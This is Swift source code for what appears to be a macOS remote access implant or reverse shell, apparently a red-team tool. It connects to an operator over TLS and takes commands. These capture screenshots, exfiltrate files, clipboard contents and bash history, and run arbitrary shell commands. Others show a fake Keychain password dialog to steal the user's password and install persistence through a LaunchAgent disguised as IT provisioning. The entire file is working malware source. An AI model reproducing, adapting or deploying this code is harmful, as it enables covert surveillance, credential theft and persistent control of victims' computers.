import Socket
import Foundation
import Cocoa
import SSLService

func getaddy() -> [String] {
    //getaddy function code lifted from https://stackoverflow.com/questions/25626117/how-to-get-ip-addresses-in-swift/25627545
    var addresses = [String]()
    
    var ifaddr : UnsafeMutablePointer<ifaddrs>?
    guard getifaddrs(&ifaddr) == 0 else { return [] }
    guard let firstAddr = ifaddr else { return [] }
    
    for ptr in sequence(first: firstAddr, next: { $0.pointee.ifa_next}) {
        let flags = Int32(ptr.pointee.ifa_flags)
        let addr = ptr.pointee.ifa_addr.pointee
        
        if (flags & (IFF_UP|IFF_RUNNING|IFF_LOOPBACK)) == (IFF_UP|IFF_RUNNING) {
            if addr.sa_family == UInt8(AF_INET) || addr.sa_family == UInt8(AF_INET6) {
                var hostname = [CChar](repeating: 0, count: Int(NI_MAXHOST))
                if (getnameinfo(ptr.pointee.ifa_addr, socklen_t(addr.sa_len), &hostname, socklen_t(hostname.count),nil, socklen_t(0), NI_NUMERICHOST) == 0) {
                    let address = String(cString: hostname)
                    addresses.append(address)
                }
            }
        }
    }
    freeifaddrs(ifaddr)
    return addresses
    
}

do {
    let config = SSLService.Configuration.init()
    let sock = try Socket.create()
    sock.delegate = try SSLService(usingConfiguration: config)
    let canary = "SwiftShellR0ckZ!"
    let fileMan = FileManager.default
    let binPath = fileMan.currentDirectoryPath
    let myName = #file
    
    try sock.connect(to: "127.0.0.1", port: 443)
    try sock.write(from: canary)
    
    let condition = 1
    
    while (condition == 1){
        let a = try sock.readString()
        if a! == "exit"{
            exit(0)
        }
        else if a! == "screenshot"{
            do {
                var displayCount: UInt32 = 0;
                var result = CGGetActiveDisplayList(0, nil, &displayCount)
                let allocated = Int(displayCount)
                let activeDisplays = UnsafeMutablePointer<CGDirectDisplayID>.allocate(capacity: allocated)
                result = CGGetActiveDisplayList(displayCount, activeDisplays, &displayCount)
                for i in 1...displayCount{
                    let screenShot:CGImage = CGDisplayCreateImage(activeDisplays[Int(i-1)])!
                    let bitmapRep = NSBitmapImageRep(cgImage: screenShot)
                    let jpegData = bitmapRep.representation(using: NSBitmapImageRep.FileType.jpeg, properties: [:])!
                    try sock.write(from: jpegData)
                
                }
                
            }
            try sock.write(from: "!EOF!")
        }
            
        else if a!.contains("download"){
            do {
                var cmd = a!
                let replacethis = "download "
                if let cmd2 = cmd.range(of: replacethis) {
                    cmd.removeSubrange(cmd2)
                }
                let downloadPath = URL(fileURLWithPath: cmd, isDirectory: false)
                
                let data2 = try Data(contentsOf: downloadPath)
                try sock.write(from: data2)
                if data2.count >= 8192{
                    try sock.write(from: "!EOF!")
                }
                
            } catch {
                try sock.write(from: "Unable to download or find this file.")
            }
            
        }
        else if a! == "pwd"{
            do {
                let fileMgr = FileManager.default
                let currPath = fileMgr.currentDirectoryPath
                try sock.write(from: currPath)
            } catch {
                try sock.write(from: "Error getting pwd.")
            }
        }
        else if a!.contains("cd "){
            do {
                var cmd2 = a!
                let replacethis2 = "cd "
                if let cmd3 = cmd2.range(of: replacethis2) {
                    cmd2.removeSubrange(cmd3)
                }
                let fileMgr2 = FileManager.default
                if fileMgr2.fileExists(atPath: cmd2){
                    fileMgr2.changeCurrentDirectoryPath(cmd2)
                    let currPath2 = fileMgr2.currentDirectoryPath
                    try sock.write(from: currPath2)
                }
                else {
                    let noGo = "Directory \(cmd2) does not exist."
                    try sock.write(from: noGo)
                }
                
            } catch {
                try sock.write(from: "Error attempting to change directories to dest dir.")
            }
            
        }
        else if a! == "listdir"{
            
            do {
                let fileMgr3 = FileManager.default
                let currDir = fileMgr3.currentDirectoryPath
                let files = try fileMgr3.contentsOfDirectory(atPath: currDir)
                var filesOnly = [String]()
                var dirsOnly = [String]()
                
                for each in files{
                    let path2 = ("\(currDir)/\(each)")
                    let fileUrl = URL(fileURLWithPath: path2)
                    let urlCheck = "\(fileUrl)"
                    if urlCheck.hasSuffix("/"){
                        dirsOnly.append("DIR>> \(each)")
                        //print("Directory: \(each)")
                    }
                    else{
                        filesOnly.append("FILE>> \(each)")
                    }
                    
                }
                
                let joinDirs = dirsOnly.joined(separator: ", ")
                let joinFiles = filesOnly.joined(separator: ", ")
                let spacer = "\n\n\n"
                let Combined = joinDirs + spacer + joinFiles
                
                try sock.write(from: Combined)
                if Combined.count >= 8192{
                    try sock.write(from: "!EOF!")
                }
                
            } catch {
                try sock.write(from: "Cannot list this directory.")
            }
            
        }
        else if a! == "clipboard"{
            do {
                let clipBoard = NSPasteboard.general
                var clipArray = [String]()
                
                for i in clipBoard.types ?? [] {
                    let i2 = clipBoard.string(forType: i) ?? String()
                    clipArray.append(i2)
                }
                let joined = clipArray.joined(separator: ", ")
                try sock.write(from: joined)
                if clipArray.count >= 8192{
                    try sock.write(from: "!EOF!")
                    
                }
                
            } catch {
                try sock.write(from: "Error grabbing clipboard contents.")
            }
            

            }
        else if a! == "prompt"{
            
            do {
                let proc = Process()
                proc.launchPath = "/usr/bin/osascript"
                let args : [String] = ["-e", ##"set popup to display dialog "Keychain Access wants to use the login keychain" & return & return & "Please enter the keychain password" & return default answer "" with title "Authentication Needed" with hidden answer"##]
                proc.arguments = args
                let pipe = Pipe()
                proc.standardOutput = pipe
                proc.launch()
                let rslts = pipe.fileHandleForReading.readDataToEndOfFile()
                let output = String(data: rslts, encoding: String.Encoding.utf8)
                try sock.write(from: output!)
                
            } catch {
                try sock.write(from: "[-] Cancel button clicked")
                
            }
            
            

        }
            
        else if a! == "connections"{
            
            do {
                let task = Process()
                task.launchPath = "/usr/sbin/lsof"
                let args : [String] = ["-a", "-i4", "-i6", "-itcp"]
                task.arguments = args
                let pipe = Pipe()
                task.standardOutput = pipe
                task.launch()
                let results = pipe.fileHandleForReading.readDataToEndOfFile()
                let out = String(data: results, encoding: String.Encoding.utf8)
                try sock.write(from: out!)
                if out!.count >= 8192{
                    try sock.write(from: "!EOF!")
                    
                }
                
            } catch {
                try sock.write(from: "Cannot get connection data.")
            }
            
        }
        else if a! == "addresses"{
            do {
                let internalAddys = getaddy()
                let internalAddys2 = internalAddys.joined(separator: ", ")
                try sock.write(from: internalAddys2) 
                
            } catch {
            try sock.write(from: "Error obtaining internal addresses.")
            }
            
        }
            
        else if a! == "listusers"{
            do {
                let uname = NSUserName()
                let fMgr = FileManager.default
                let userDir = ("/Users/")
                let files = try fMgr.contentsOfDirectory(atPath: userDir)
                let joined = files.joined(separator: ", ")
                try sock.write(from: joined)
                
            } catch {
                try sock.write(from: "Error listing local users.")
            }
            
        }
        else if a! == "userhist"{
            do {
                let uname = NSUserName()
                let histPath = URL(fileURLWithPath: "/Users/\(uname)/.bash_history", isDirectory: true)
                let histData = try Data(contentsOf: histPath)
                try sock.write(from: histData)
                if histData.count >= 8192{
                    try sock.write(from: "!EOF!")
                    
                }
                
            } catch {
                try sock.write(from: "Cannot get user bash history file contents.")
            }
            
        }
        else if a! == "checksecurity"{
            do {
                let myWorkspace = NSWorkspace.shared
                let processes = myWorkspace.runningApplications
                var procList = [String]()
                for i in processes {
                    let str1 = "\(i)"
                    procList.append(str1)
                }
                let processes2 = procList.joined(separator: ", ")
                try sock.write(from: processes2)
                if processes2.count >= 8192{
                    try sock.write(from: "!EOF!")
                    
                }
                
            } catch {
                try sock.write(from: "Error listing running applications.")
            }
            
        }
            
        else if a! == "whoami"{
            do {
                let usrname = NSUserName()
                try sock.write(from: usrname)
                
            } catch {
                try sock.write(from: "Error getting user context.")
            }
            
        }
            
        else if a! == "persist"{
            
            do {
                let progName = CommandLine.arguments[0]
                let username = NSUserName()
                let fileMan = FileManager.default
                let newURL = URL(fileURLWithPath: "/Users/\(username)/.IT-provision/user-provision", isDirectory: false)
                try fileMan.createDirectory(atPath: "/Users/\(username)/.IT-provision", withIntermediateDirectories: true, attributes: nil)
                let binFiles = try fileMan.contentsOfDirectory(atPath: binPath)
                for file in binFiles {
                    let x = "\(file)"
                    let progName2 = progName.replacingOccurrences(of: "./", with: "",options: .literal)
                    
                    if x == progName2 {
                        let getPath = URL(fileURLWithPath: "/\(binPath)/\(progName2)", isDirectory: false)
                        let toPath = URL(fileURLWithPath: "/Users/\(username)/.IT-provision/user-provision")
                        try FileManager.default.copyItem(at: getPath, to: toPath)
                        
                    }
                    
                }
                
                let content = "<plist version=\"1.0\">\r".data(using: .utf8)
                
                try fileMan.createFile(atPath: "/Users/\(username)/Library/LaunchAgents/com.user.provision.plist", contents: content, attributes: nil)
                
                let plistURL = URL(fileURLWithPath: "/Users/\(username)/Library/LaunchAgents/com.user.provision.plist")
                
                let fHandle = try FileHandle(forWritingTo: plistURL)
                fHandle.seekToEndOfFile()
                fHandle.write("    <dict>\r".data(using: .utf8)!)
                fHandle.write("    <key>Label</key>\r".data(using: .utf8)!)
                fHandle.write("        <string>com.user.provision</string>\r".data(using: .utf8)!)
                fHandle.write("    <key>ProgramArguments</key>\r".data(using: .utf8)!)
                fHandle.write("    <array>\r".data(using: .utf8)!)
                fHandle.write("        <string>/Users/\(username)/.IT-provision/./user-provision</string>\r".data(using: .utf8)!)
                fHandle.write("    </array>\r".data(using: .utf8)!)
                fHandle.write("    <key>RunAtLoad</key>\r".data(using: .utf8)!)
                fHandle.write("        <true/>\r".data(using: .utf8)!)
                fHandle.write("    <key>AbandonProcessGroup</key>\r".data(using: .utf8)!)
                fHandle.write("        <true/>\r".data(using: .utf8)!)
                fHandle.write("    </dict>\r".data(using: .utf8)!)
                fHandle.write("</plist>".data(using: .utf8)!)
                fHandle.closeFile()
                
                let task = Process()
                task.launchPath = "/bin/launchctl"
                let args : [String] = ["load", "/Users/\(username)/Library/LaunchAgents/com.user.provision.plist"]
                task.arguments = args
                let pipe = Pipe()
                task.standardOutput = pipe
                task.launch()
                let results = pipe.fileHandleForReading.readDataToEndOfFile()
                let out = String(data: results, encoding: String.Encoding.utf8)
                
                try sock.write(from: "[+] Plist file written and persistence added!")
                
            } catch {
                try sock.write(from: "Error attempting LaunchAgent persistence.")
            }
          
        }
            
        else if a! == "unpersist"{
            
            do {
            let username = NSUserName()
            let task = Process()
            task.launchPath = "/bin/launchctl"
            let args : [String] = ["unload", "/Users/\(username)/Library/LaunchAgents/com.user.provision.plist"]
            task.arguments = args
            let pipe = Pipe()
            task.standardOutput = pipe
            task.launch()
            let results = pipe.fileHandleForReading.readDataToEndOfFile()
            let out = String(data: results, encoding: String.Encoding.utf8)
            
            let fileMgr = FileManager.default
            let delPath = URL(fileURLWithPath: "/Users/\(username)/.IT-provision", isDirectory: true)
            let delPath2 = URL(fileURLWithPath: "/Users/\(username)/Library/LaunchAgents/com.user.provision.plist", isDirectory: false)
            try fileMgr.removeItem(at: delPath)
            try fileMgr.removeItem(at: delPath2)
            let result = "[+] Successfully removed launch agent persistence"
            try sock.write(from: result)
            } catch{
                let result = "[-] Unable to remove launch agent persistence"
                try sock.write(from: result)
            }
//
        }
        
        else if a! == "systeminfo"{
            
            do {
                let osVer = ProcessInfo.processInfo.operatingSystemVersionString
                let osVer2 = "OS Version: \(osVer)"
                let upTime = ProcessInfo.processInfo.systemUptime
                let upTime3 = Date() - upTime
                let upTime2 = "Time of last boot: \(upTime3)"
                let procCount = ProcessInfo.processInfo.processorCount
                let procCount2 = "Processor Count: \(procCount)"
                let hostName = ProcessInfo.processInfo.hostName
                let hostName2 = "Hostname: \(hostName)"
                let uName = NSUserName()
                let uName2 = "Current username: \(uName)"
                let fullName = NSFullUserName()
                let fullName2 = "Full User Name: \(fullName)"
                let intAddresses : [String] = getaddy()
                let joinAddr = intAddresses.joined(separator: ", ")
                let fMgr = FileManager.default
                let userDir = ("/Users/")
                let files = try fMgr.contentsOfDirectory(atPath: userDir)
                let filesjoin = files.joined(separator: ", ")
                
                let flManager = FileManager.default
                let jamfpath1 = "/usr/local/bin/jamf"
                let jamfpath2 = "/usr/local/jamf"
                var jamChk = false
                
                if (flManager.fileExists(atPath: jamfpath1) || flManager.fileExists(atPath: jamfpath2)){
                    jamChk = true
                }
                
                var sysInfo = [String]()
                sysInfo.append(osVer2)
                sysInfo.append(upTime2)
                sysInfo.append(procCount2)
                sysInfo.append(hostName2)
                sysInfo.append(fullName2)
                sysInfo.append(uName2)
                sysInfo.append("Internal Address(es):")
                sysInfo.append(joinAddr)
                sysInfo.append("Users found:")
                sysInfo.append(filesjoin)
                if jamChk == true{
                    sysInfo.append("[+] jamf was found. Can run commands such as jamf checkJSSConnection (shows the CASPER server url) and jamf listUsers (lists local accounts.")
                }
                else{
                    sysInfo.append("[-] jamf not found")
                }
                
                let joined = sysInfo.joined(separator: ", ")
                try sock.write(from: joined)
                
            } catch {
                try sock.write(from: "Error getting system info.")
            }
            
        }
        else if a!.contains("cat"){
            
            do {
                
            }
                var a2 = a!
                let replace = "cat "
                if let changed = a2.range(of: replace) {
                    a2.removeSubrange(changed)
                }
                
                let sshotPath = URL(fileURLWithPath: "\(a2)")
                let fileData = try Data(contentsOf: sshotPath)
                try sock.write(from: fileData)
                if fileData.count >= 8192{
                    try sock.write(from: "!EOF!")
                }
            
        }
        else {
            
            do {
                var otherCmd = a!
                let replaceMe = "shell "
                if let otherCmd2 = otherCmd.range(of: replaceMe) {
                    otherCmd.removeSubrange(otherCmd2)
                }
                
                let f = otherCmd.components(separatedBy: " ")
                
                var numCommands = f.count
                
                let lookup = Process()
                lookup.launchPath = "/usr/bin/which"
                
                let arguments : [String] = ["\(f[0])"]
                lookup.arguments = arguments
                let pipe1 = Pipe()
                lookup.standardOutput = pipe1
                lookup.launch()
                let g = pipe1.fileHandleForReading.readDataToEndOfFile()
                var h = String(data: g, encoding: String.Encoding.utf8)
                
                var n = h!.trimmingCharacters(in: CharacterSet.newlines)
                
                var pathToUse = n
                lookup.terminate()
                let proc = Process()
                proc.launchPath = pathToUse
                let cmdArray = f.dropFirst()
                var args = [String]()
                
                for i in cmdArray{
                    args.append(i)
                }
                
                proc.arguments = args
                let pipe = Pipe()
                proc.standardOutput = pipe
                proc.launch()
                let response = pipe.fileHandleForReading.readDataToEndOfFile()
                let out = String(data: response, encoding: String.Encoding.utf8)
                var x = out!.trimmingCharacters(in: CharacterSet.newlines)
                try sock.write(from: x)
                if x.count >= 8192{
                    try sock.write(from: "!EOF!")
                    
                }
                
            }
                
            catch {
            try sock.write(from: "Error while attempting to execute shell command.")
            }
            
        }
        
} //while loop brace
    
} //do brace
    
catch let error {
    print(error.localizedDescription)
}

